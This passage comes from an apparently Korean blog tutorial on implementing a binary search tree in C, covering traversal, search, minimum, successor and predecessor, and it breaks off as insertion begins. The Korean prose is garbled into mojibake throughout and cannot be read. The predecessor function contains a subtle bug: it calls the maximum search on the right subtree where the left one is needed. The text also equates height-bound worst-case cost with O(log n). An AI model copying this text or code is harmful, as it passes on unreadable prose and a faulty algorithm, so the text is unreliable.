í‚¤ë³´ë‹¤ í•˜ë‚˜ ì‘ì€ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_predecessor(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// í‚¤ ìˆœìœ¼ë¡œ ì •ë ¬í–ˆì„ ë•Œ ë…¸ë“œì˜ í‚¤ë³´ë‹¤ í•˜ë‚˜ í° í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_successor(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// íŠ¸ë¦¬ì—ì„œ ë…¸ë“œ uì˜ ìœ„ì¹˜ì— ë…¸ë“œ vë¥¼ ëŒ€ì…í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v);</span><br></pre></td></tr></table></figure><h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EA%B5%AC%ED%98%84" tabindex="-1">ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ êµ¬í˜„</h2><h3 id="%ED%8A%B8%EB%A6%AC-%EC%88%9C%ED%9A%8C%ED%95%98%EA%B8%B0" tabindex="-1">íŠ¸ë¦¬ ìˆœíšŒí•˜ê¸°</h3><p>ì´ì œ ì œì¼ ì‰¬ìš´ í•¨ìˆ˜ë¶€í„° í•˜ë‚˜ì”© êµ¬í˜„í•´ ë´…ì‹œë‹¤. ê°€ì¥ ë¨¼ì € ìˆœíšŒëŠ” ì•„ì£¼ ì‰¬ìš´ë°, ì´ì§„ íŠ¸ë¦¬ë¥¼ ì¤‘ìœ„ ìˆœíšŒ(in-order)í•´ì£¼ë©´ ë©ë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆë¡œ ì¸í•´ í‚¤ê°€ ì‘ì€ ë…¸ë“œë¶€í„° ì •ë ¬ëœ ìˆœì„œë¡œ ìˆœíšŒí•˜ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/2.png" alt="2.png"></p><p>ìˆœíšŒë¥¼ ìœ„í•œ ë‚´ì¥ í•¨ìˆ˜ <code>__tree_walk</code> ëŠ” ì¬ê·€ í˜¸ì¶œì„ ì´ìš©í•´ êµ¬í˜„í•©ë‹ˆë‹¤. ì™¼ìª½ íŠ¸ë¦¬ë¥¼ ì¬ê·€ì ìœ¼ë¡œ ìˆœíšŒí•˜ê³ , ìì‹ ì˜ í‚¤ì™€ ê°’ì„ ì¶œë ¥í•˜ê³ , ë‹¤ì‹œ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ë¥¼ ì¬ê·€ì ìœ¼ë¡œ ìˆœíšŒí•˜ëŠ” ë°©ì‹ì…ë‹ˆë‹¤. íŠ¸ë¦¬ì˜ ì¶œë ¥ì„ ìœ„í•œ <code>print</code> í•¨ìˆ˜ëŠ” ë£¨íŠ¸ ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ìˆœíšŒë¥¼ ìˆ˜í–‰í•˜ë©´ ë©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë‚´ì¥ í•¨ìˆ˜</span></span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x) &#123;</span><br><span class="line"><span class="keyword">if</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">__tree_walk(x-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, x-&gt;key, x-&gt;value);</span><br><span class="line">__tree_walk(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span> &#123;</span><br><span class="line">__tree_walk(bst-&gt;root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="%ED%82%A4%EB%A5%BC-%EA%B0%80%EC%A7%84-%EB%85%B8%EB%93%9C-%EC%B0%BE%EA%B8%B0" tabindex="-1">í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œ ì°¾ê¸°</h3><p>ë‹¤ìŒì€ íƒìƒ‰ì…ë‹ˆë‹¤. íƒìƒ‰ì€ íŠ¹ì • í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ëŠ” ì—°ì‚°ìœ¼ë¡œ, ì‚¬ìš©í•˜ëŠ” ì–¸ì–´ê°€ ë”•ì…”ë„ˆë¦¬(dictionary), ë§µ(map), ì—°ê´€ ë°°ì—´(associative array) ê°™ì€ ì´ë¦„ì˜ ìë£Œêµ¬ì¡°ë¥¼ ì§€ì›í•œë‹¤ë©´ ìˆ±í•˜ê²Œ ì“°ëŠ” ì—°ì‚°ì…ë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ëŠ” ì´ì§„ íƒìƒ‰ì„ í†µí•´ í‰ê· ì ìœ¼ë¡œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> ì‹œê°„ì— íŠ¹ì • í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ê·¸ë¦¼ì€ ì´ì§„ íƒìƒ‰ì„ í†µí•´ í‚¤ <code>13</code> ì„ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ëŠ” ê³¼ì •ì„ ë‚˜íƒ€ë‚´ê³  ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/3.png" alt="3.png"></p><p>íƒìƒ‰ì„ ìœ„í•œ ë‚´ì¥ í•¨ìˆ˜ <code>__tree_search</code> ëŠ” ë…¸ë“œ <code>x</code> ì˜ í‚¤ì™€ ì£¼ì–´ì§„ <code>key</code> ë¥¼ ë°˜ë³µí•˜ì—¬ ë¹„êµí•©ë‹ˆë‹¤. ì£¼ì–´ì§„ <code>key</code> ê°€ ë” í¬ë‹¤ë©´ <code>x</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì„ <code>x</code> ì— ëŒ€ì…í•˜ì—¬ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ ë°˜ë³µì„ ê³„ì†í•©ë‹ˆë‹¤. <code>key</code> ê°€ ë” ì‘ì€ ê²½ìš° ì™¼ìª½ íŠ¸ë¦¬ì—ì„œ ë°˜ë³µì„ ê³„ì†í•©ë‹ˆë‹¤. ë°˜ë³µë¬¸ì˜ ì¢…ë£Œ ì¡°ê±´ìœ¼ë¡œ <code>x</code> ì˜ í‚¤ì™€ <code>key</code> ê°€ ì¼ì¹˜í•˜ë©´ ì„±ê³µì ìœ¼ë¡œ ì°¾ì€ ê²½ìš°ì…ë‹ˆë‹¤. <code>x</code> ê°€ <code>NULL</code> ì´ ë˜ëŠ” ê²½ìš°ëŠ” ì£¼ì–´ì§„ <code>key</code> ë¥¼ ì°¾ì§€ ëª»í•œ ê²½ìš°ì…ë‹ˆë‹¤.</p><p>íƒìƒ‰ ì—°ì‚°ì€ ì¼ë°˜ì ì¸ ì´ì§„ íƒìƒ‰ê³¼ ë§¤ìš° ìœ ì‚¬í•©ë‹ˆë‹¤. <code>__tree_walk</code> ì™€ ê°™ì´ ì¬ê·€ì ìœ¼ë¡œ êµ¬í˜„í•  ìˆ˜ë„ ìˆìœ¼ë‚˜, ë°˜ë³µì ìœ¼ë¡œ êµ¬í˜„í•˜ëŠ” ìª½ì´ í•¨ìˆ˜ í˜¸ì¶œê³¼ ë°˜í™˜ì— í•„ìš”í•œ ì‹œê°„ê³¼ ê³µê°„ì„ ì•„ë‚„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¸ë¦¬ì—ì„œì˜ íƒìƒ‰ ì—°ì‚°ì„ ìœ„í•œ <code>__search</code> í•¨ìˆ˜ëŠ” ë£¨íŠ¸ ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ íƒìƒ‰ì„ ìˆ˜í–‰í•˜ë©´ ë©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë‚´ì¥ í•¨ìˆ˜</span></span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">search</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_search(bst-&gt;root, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê°™ì€ ì›ë¦¬ë¡œ ê°€ì¥ ì‘ì€ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•˜ëŠ” <code>__tree_min</code>, ê°€ì¥ í° í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•˜ëŠ” <code>__tree_max</code> ë‚´ì¥ í•¨ìˆ˜ë„ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì— ë”°ë¼ ì™¼ìª½ ìì‹ë§Œ ë”°ë¼ê°€ë©´ ê°€ì¥ ì‘ì€ í‚¤, ì˜¤ë¥¸ìª½ ìì‹ë§Œ ë”°ë¼ê°€ë©´ ê°€ì¥ í° í‚¤ê°€ ë‚˜ì˜¤ê²Œ ë©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_min(Node *x) &#123;</span><br><span class="line"><span class="keyword">while</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">x = x-&gt;left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="%EC%9D%B4%EC%A0%84%EA%B3%BC-%EB%8B%A4%EC%9D%8C-%EB%85%B8%EB%93%9C-%EC%B0%BE%EA%B8%B0" tabindex="-1">ì´ì „ê³¼ ë‹¤ìŒ ë…¸ë“œ ì°¾ê¸°</h3><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ëŠ” ì •ë ¬ëœ ìë£Œêµ¬ì¡°ì…ë‹ˆë‹¤. ì •ë ¬ëœ ìë£Œêµ¬ì¡°ì—ì„œëŠ” íŠ¹ì • ë°ì´í„°ì˜ ì´ì „ ìˆœì„œë‚˜ ë‹¤ìŒ ìˆœì„œì˜ ë°ì´í„°ë¥¼ ì¡°íšŒí•´ì•¼ í•˜ëŠ” ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì„ í™œìš©í•˜ë©´, ì´ì „ ìˆœì„œë‚˜ ë‹¤ìŒ ìˆœì„œë¥¼ ì°¾ê¸° ìœ„í•´ í‚¤ë¥¼ ì„œë¡œ ë¹„êµí•˜ì§€ ì•Šê³ ë„ ì´ë“¤ ë…¸ë“œë¥¼ ì°¾ì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë¨¼ì € ë‹¤ìŒ ìˆœì„œë¥¼ ì°¾ëŠ” ì—°ì‚°ì„ ë³´ê² ìŠµë‹ˆë‹¤. ë‹¤ìŒ ìˆœì„œë¥¼ ì°¾ì„ ë•ŒëŠ” íŠ¸ë¦¬ì˜ í˜•íƒœì— ë”°ë¼ ê·¸ë¦¼ê³¼ ê°™ì´ ë‘ ê°€ì§€ ê²½ìš°ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. ê·¸ë¦¼ì˜ ì™¼ìª½ì€ <code>3</code> ì˜ ë‹¤ìŒ ë…¸ë“œ <code>4</code> ë¥¼ ì°¾ëŠ” ê³¼ì •ìœ¼ë¡œ, <code>3</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì´ ì¡´ì¬í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì— ë”°ë¼, ì˜¤ë¥¸ìª½ ìì‹ì´ ì¡´ì¬í•˜ëŠ” ê²½ìš° ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ í‚¤ê°€ ìµœì†Ÿê°’ì¸ ë…¸ë“œë¥¼ ì°¾ìœ¼ë©´ ë©ë‹ˆë‹¤. í˜„ì¬ ë…¸ë“œë³´ë‹¤ í‚¤ê°€ í° ë…¸ë“œë“¤ ì¤‘ì—ì„œ ê°€ì¥ ì‘ì€ ë…¸ë“œë¥¼ ì°¾ìœ¼ë©´ ê·¸ê²ƒì´ ë‹¤ìŒ ë…¸ë“œì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/4.png" alt="4.png"></p><p>ê·¸ë¦¼ì˜ ì˜¤ë¥¸ìª½ì€ <code>5</code> ì˜ ë‹¤ìŒ ë…¸ë“œê°€ <code>6</code> ì„ ì°¾ê³  ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° <code>5</code> ëŠ” ì˜¤ë¥¸ìª½ ìì‹ ë…¸ë“œê°€ ì—†ìŠµë‹ˆë‹¤. ì´ëŸ° ê²½ìš°ì—ë„ ìê¸°ë³´ë‹¤ í‚¤ê°€ ì‘ì€ ë…¸ë“œëŠ” ì™¼ìª½ íŠ¸ë¦¬, í° ë…¸ë“œëŠ” ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì— ì¡´ì¬í•œë‹¤ëŠ” ì„±ì§ˆì„ ì´ìš©í•©ë‹ˆë‹¤. ê¸°ì¤€ ë…¸ë“œì˜ ì¡°ìƒ ë…¸ë“œë“¤ì„ ì¡°íšŒí•˜ë©´ì„œ ê¸°ì¤€ ë…¸ë“œë¥¼ ì™¼ìª½ íŠ¸ë¦¬ì˜ ë…¸ë“œë¡œ ê°–ëŠ” ì²« ë²ˆì§¸ ì¡°ìƒì„ ì°¾ìœ¼ë©´, í‚¤ì˜ ë¹„êµ ì—†ì´ë„ ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”ìš± ë³µì¡í•œ ì´ ê²½ìš°ë„ ìµœì•…ì˜ ì‹œê°„ ë³µì¡ë„ê°€ íŠ¸ë¦¬ì˜ ë†’ì´ì— ë¹„ë¡€í•˜ë¯€ë¡œ, ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ëŠ” ì—°ì‚°ì˜ ì‹œê°„ ë³µì¡ë„ëŠ” <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>ì…ë‹ˆë‹¤.</p><p>ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ëŠ” ë‚´ì¥ í•¨ìˆ˜ <code>__tree_successor</code> ëŠ” ë‘ ê²½ìš°ë¥¼ êµ¬ë¶„í•˜ê¸° ìœ„í•œ ë¶„ê¸°ë¬¸ì´ ì¡´ì¬í•©ë‹ˆë‹¤. 4í–‰ì€ ì˜¤ë¥¸ìª½ ìì‹ì´ ì¡´ì¬í•˜ëŠ” ê²½ìš°ë¡œ, <code>__tree_min</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ í‚¤ê°€ ìµœì†Ÿê°’ì¸ ë…¸ë“œë¥¼ ì°¾ì•„ ë°˜í™˜í•©ë‹ˆë‹¤. 7í–‰ì€ ì˜¤ë¥¸ìª½ ìì‹ì´ ì—†ëŠ” ê²½ìš°ë¡œ, ì´ ë•ŒëŠ” ë‘ ë…¸ë“œì˜ ê´€ê³„ë¥¼ ë¹„êµí•˜ê¸° ìœ„í•´ ê¸°ì¤€ ë…¸ë“œ <code>x</code> ì˜ ë¶€ëª¨ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° <code>y</code> ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. <code>x</code> ëŠ” ë¶€ëª¨ ë…¸ë“œë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„°ë¥¼ ê³„ì† ë”°ë¼ê°€ë©´ì„œ, <code>y</code> ê°€ <code>x</code> ì˜ ë¶€ëª¨ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ê³„ì† ê°±ì‹ í•©ë‹ˆë‹¤. ì²˜ìŒìœ¼ë¡œ <code>x</code> ê°€ <code>y</code> ì˜ ì™¼ìª½ ìì‹ì´ ë˜ëŠ” ìˆœê°„, <code>y</code> ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</p><p>ì£¼ì–´ì§„ í‚¤ì— ëŒ€í•œ ë‹¤ìŒ ë…¸ë“œë¥¼ ë°˜í™˜í•˜ëŠ” ì—°ì‚°ì— í•´ë‹¹í•˜ëŠ” <code>next</code> í•¨ìˆ˜ëŠ” ì•ì„œ êµ¬í˜„í•œ ë‚´ì¥ í•¨ìˆ˜ <code>__tree_search</code> ë¥¼ ì´ìš©í•´ ì£¼ì–´ì§„ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ìŠµë‹ˆë‹¤. ì´í›„ í•´ë‹¹ ë…¸ë“œì— ëŒ€í•´ ë‚´ì¥ í•¨ìˆ˜ <code>__tree_successor</code> ë¥¼ í˜¸ì¶œí•˜ì—¬ ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ì•„ ë°˜í™˜í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë‚´ì¥ í•¨ìˆ˜</span></span><br><span class="line">Node *__tree_successor(Node *x) &#123;</span><br><span class="line">Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_min(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;right) &#123;</span><br><span class="line">x = y;</span><br><span class="line">y = y-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> __tree_successor(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ì „ ìˆœì„œë¥¼ ì°¾ì„ ë•Œë„ íŠ¸ë¦¬ì˜ í˜•íƒœì— ë”°ë¼ ë‘ ê°€ì§€ ê²½ìš°ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. ë‹¤ìŒ ìˆœì„œë¥¼ ì°¾ì„ ë•Œì™€ ë˜‘ê°™ì´ ì²˜ë¦¬í•˜ë©´ ë©ë‹ˆë‹¤. ì™¼ìª½ ìì‹ì´ ìˆëŠ” ê²½ìš°ëŠ” ì™¼ìª½ íŠ¸ë¦¬ì—ì„œ ìµœëŒ“ê°’ì„ ë°˜í™˜í•©ë‹ˆë‹¤. ì™¼ìª½ ìì‹ì´ ì—†ëŠ” ê²½ìš°, ì¡°ìƒ ë…¸ë“œë“¤ì„ ì¡°íšŒí•˜ë©´ì„œ ê¸°ì¤€ ë…¸ë“œë¥¼ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì˜ ë…¸ë“œë¡œ ê°–ëŠ” ì²« ë²ˆì§¸ ì¡°ìƒì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/5.png" alt="5.png"></p><p>ì´ì „ ë…¸ë“œë¥¼ ì°¾ëŠ” ë‚´ì¥ í•¨ìˆ˜ <code>__tree_predecessor</code> ì™€, ì£¼ì–´ì§„ í‚¤ì— ëŒ€í•œ ì´ì „ ë…¸ë“œë¥¼ ì°¾ëŠ” í•¨ìˆ˜ <code>prev</code> ëŠ” ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ëŠ” ì½”ë“œì™€ ë˜‘ê°™ì€ ì›ë¦¬ë¡œ êµ¬í˜„í•˜ë©´ ë©ë‹ˆë‹¤. ë‹¨, ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜ê°€ <code>__tree_min</code> ì—ì„œ <code>__tree_max</code> ë¡œ ë°”ë€ŒëŠ” ë“± ë°©í–¥ë§Œ ë°”ê¿”ì¤ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë‚´ì¥ í•¨ìˆ˜</span></span><br><span class="line">Node *__tree_predecessor(Node *x) &#123;</span><br><span class="line">Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_max(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;left) &#123;</span><br><span class="line">x = y;</span><br><span class="line">y = y-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> __tree_predecessor(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="%ED%8A%B8%EB%A6%AC%EC%97%90-%EB%85%B8%EB%93%9C-%EC%82%BD%EC%9E%85%ED%95%98%EA%B8%B0" tabindex="-1">íŠ¸ë¦¬ì— ë…¸ë“œ ì‚½ì…í•˜ê¸°</h3><p>ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì— ì¶”ê°€í•˜ëŠ” ì—°ì‚°ì€ ì‚½ì… ì—°ì‚°ì…ë‹ˆë‹¤. ì‚½ì… ì—°ì‚°ì€ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ í•­ìƒ ë¦¬í”„ ë…¸ë“œë¡œ ì¶”ê°€í•˜ë©´ ì‰½ê²Œ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ê·¸ë¦¼ì€ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì— ìƒˆë¡œìš´ í‚¤ <code>7</code> ì„ ê°€ì§„ ë…¸ë“œë¥¼ ì‚½ì…í•˜ëŠ” ê³¼ì •ì„ ë‚˜íƒ€ë‚´ê³  ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/6.png" alt="6.png"></p><p>ë…¸ë“œë¥¼ ì‚½ì…í•˜ê¸° ìœ„í•´ì„œëŠ”, ì´ì§„ íƒìƒ‰ì„ í†µí•´ ì‚½ì…í•  ë…¸ë“œë¥¼ ìì‹ìœ¼ë¡œ ê°€ì§ˆ ë…¸ë“œë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤. ì‚½ì…í•  ë…¸ë“œë¥¼ ì™¼ìª½ ìì‹ìœ¼ë¡œ ê°€ì§ˆ ë…¸ë“œë¼ë©´ ê¸°ì¡´ì— ì™¼ìª½ ìì‹ì´ ì—†ì–´ì•¼ í•˜ê³ , ì˜¤ë¥¸ìª½ ìì‹ìœ¼ë¡œ ê°€ì§ˆ ë…¸ë“œë¼ë©´ ì˜¤ë¥¸ìª½ ìì‹ì´ ì—†ì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë¦¼ì—ì„œëŠ” ì´ì§„ íƒìƒ‰ì„ í†µí•´ í‚¤ <code>7</code> ì˜ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ì‚½ì…í•  ë…¸ë“œë¥¼ ì°¾ìŠµë‹ˆë‹¤. í‚¤ <code>8</code> ì„ ê°€ì§„ ë…¸ë“œê°€ ì™¼ìª½ ìì‹ì´ ì—†ìœ¼ë©´ì„œ, <code>7</code> ì€ <code>8</code> ë³´ë‹¤ ì‘ìœ¼ë‹ˆ í•´ë‹¹ ë…¸ë“œì˜ ì™¼ìª½ ìì‹ìœ¼ë¡œ ì‚½ì…í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì‚½ì… ì—°ì‚°ì˜ ì‹œê°„ ë³µì¡ë„ ë˜í•œ íŠ¸ë¦¬ì˜ ë†’ì´ì— ë¹„ë¡€í•˜ë¯€ë¡œ, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>ì…ë‹ˆë‹¤.</p><p>ì‚½ì… ì—°ì‚°ì„ êµ¬í˜„í•œ <code>insert</code> í•¨ìˆ˜ëŠ” í‚¤ì™€ ê°’ì„ ì¸ìë¡œ ë°›ê³ , <code>malloc</code> í•¨ìˆ˜ë¥¼ í†µí•´ 